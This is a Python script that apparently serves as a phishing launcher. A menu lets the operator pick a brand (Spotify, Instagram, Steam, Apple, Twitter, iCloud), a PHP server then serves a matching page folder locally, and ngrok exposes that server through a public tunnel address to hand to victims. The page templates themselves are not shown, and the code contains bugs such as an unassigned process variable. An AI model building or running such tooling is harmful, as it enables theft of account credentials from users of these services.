import os
import signal
import subprocess
from pyngrok import ngrok

platform=""
ch,loop_count= 0,0
err_invalid = False


class colors:
    BLACK    = '\33[30m'
    RED      = '\33[31m'
    GREEN    = '\33[32m'
    YELLOW   = '\33[33m'
    BLUE     = '\33[34m'
    VIOLET   = '\33[35m'
    BEIGE    = '\33[36m'
    WHITE    = '\33[37m'
    BLACKBG  = '\33[40m'
    REDBG    = '\33[41m'
    GREENBG  = '\33[42m'
    YELLOWBG = '\33[43m'
    BLUEBG   = '\33[44m'
    VIOLETBG = '\33[45m'
    BEIGEBG  = '\33[46m'
    WHITEBG  = '\33[47m'
    END      = '\33[0m'



def tunneling():
	tcp = ngrok.connect(8080,"tcp")
	print(colors.GREEN+"here your ngrok address >> "+str(tcp)+colors.END)
	input("")

def prepare(pfm,loop_count):
	os.system("clear")
	try:
		print(colors.YELLOW+" ' Ctrl + C ' for back to menu \n")
		print("System : "+colors.GREEN+"active \n"+colors.YELLOW+"Running : "+colors.GREEN+"localhost:8080 >>>  {}".format(pfm)+colors.BLACK)
		php = "php -S localhost:8080 -t sites/{} > /dev/null 2>1&".format(pfm)
		if(loop_count < 1):
			pro = subprocess.Popen(php, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid) 		
		else:
			os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
			pro = subprocess.Popen(php, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid) 		
		loop_count += 1
		tunneling()
	except:
		print(" ~ kill process")
		os.killpg(os.getpgid(pro.pid), signal.SIGTERM) 


platforms = {

1:"spotify",
2:"instagram",
3:"steam",
4:"apple",
5:"twitter",
6:"icloud"

}

print_platforms ="""

{2}         CHOOSE A PLATFORM :

{0} [CTRL + Z] {3} FOR QUIT

{0} [1] {1} SPOTIFY          {0} [4] {1} APPLE
{0} [2] {1} INSTAGRAM        {0} [5] {1} TWITTER
{0} [3] {1} STEAM            {0} [6] {1} ICLOUD

{3}""".format(colors.YELLOW,colors.WHITE,colors.BEIGE,colors.VIOLET)

while(True):

	if(loop_count > 0):
		os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
		
	check = False
	os.system("clear")
	print(print_platforms)

	try:
		if(err_invalid): print(colors.RED+"\nplease, enter a valid number ! \n"+colors.VIOLET)
		ch,check = int(input(" >> ")),True
	except: err_invalid = True

	if(check):
		for i in platforms:
			if i == int(ch):
				platform = platforms[int(ch)]
				prepare(platform,loop_count)
